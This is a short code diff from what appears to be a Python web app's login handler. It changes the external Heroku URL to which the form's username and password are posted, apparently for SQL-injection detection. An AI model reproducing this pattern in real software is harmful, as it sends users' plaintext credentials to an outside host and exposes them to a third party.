@@ -93,7 +93,7 @@ def login_post():
         
         payload={'event1':request.form["username"],'event2':request.form["password"]}
         
-        r = requests.post("https://webappsqli.heroku.com/detection", data=payload)
+        r = requests.post("https://taikifdashboard.herokuapp.com/detection", data=payload)
         
         return redirect('/login')
     
